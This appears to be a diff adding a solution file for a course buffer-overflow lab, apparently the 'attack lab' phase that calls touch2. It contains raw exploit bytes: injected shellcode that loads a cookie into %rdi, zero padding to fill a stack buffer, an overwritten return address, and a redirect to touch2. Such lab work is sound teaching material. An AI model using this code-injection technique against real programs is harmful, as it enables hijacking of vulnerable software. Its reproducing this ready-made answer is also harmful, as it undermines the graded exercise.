@@ -1,0 +1,11 @@
+/*shell code to move cookie to %rdi*/
+48 c7 c7 f1 1e d6 5c c3
+/*Filling up buffer*/
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+/*Overwriting address*/
+78 04 67 55 00 00 00 00
+/*ret(c3) will continue the control here so this redirects to touch2*/
+6b 18 40 00 00 00 00 00
+
